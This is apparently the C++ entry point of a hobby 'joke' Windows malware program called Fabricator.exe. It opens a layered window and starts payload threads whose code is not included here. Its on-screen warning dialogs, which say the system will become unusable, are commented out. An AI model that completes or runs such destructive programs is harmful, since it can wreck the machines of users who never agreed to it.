#include <windows.h>
#include "shaderthreads.h"
#include "payloadthreads.h"
#include "define.h"
#include "vscreen.h"
//#include "audiothread.h" initially from orion, will implement later

#pragma comment(lib, "Msimg32.lib")

int WinMain(
	_In_ HINSTANCE hInstance,
	_In_opt_ HINSTANCE hPrevInstance,
	_In_ LPSTR lpCmdLine,
	_In_ int nShowCmd
) {
	/*
	int msgResult = MessageBox(NULL, L"Hold it there... you just executed malware!!\nThis malware wasn't made for malicious purposes, which is why I am warning you incase you ran this by accident!", L"Fabricator.exe", MB_YESNO | MB_TOPMOST | MB_ICONWARNING);
	if (msgResult != IDYES) {
		ExitProcess(0);
	}
	msgResult = MessageBox(NULL, L"FINAL WARNING! IF YOU CONTINUE, YOUR SYSTEM WILL BECOME COMPLETELY UNUSABLE!!\nDO NOT RUN THIS ON YOUR PERSONAL COMPUTER!\nStill continue?!", L"Fabricator.exe - LAST WARNING", MB_YESNO | MB_TOPMOST | MB_ICONWARNING);
	if (msgResult != IDYES) {
		ExitProcess(0);
	}
	*/ // annoying for testing, will re-enable later when needed

	InitLayeredWindow(hInstance);

	// Payload7H = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Payload7T, NULL, 0, NULL);
	//HANDLE Payload6H = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Payload6T, NULL, 0, NULL);
	//HANDLE Payload5H = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Payload5T, NULL, 0, NULL);
	HANDLE Payload4H = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Payload4T, NULL, 0, NULL);
	//HANDLE Payload4H = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Payload4T, NULL, 0, NULL);
	//Sleep(2000);
	HANDLE Payload2H = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Payload2T, NULL, 0, NULL);
	//Sleep(1000);
	//HANDLE Shader2H = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Shader1T, NULL, 0, NULL);
	Sleep(10000);

	return 0;
}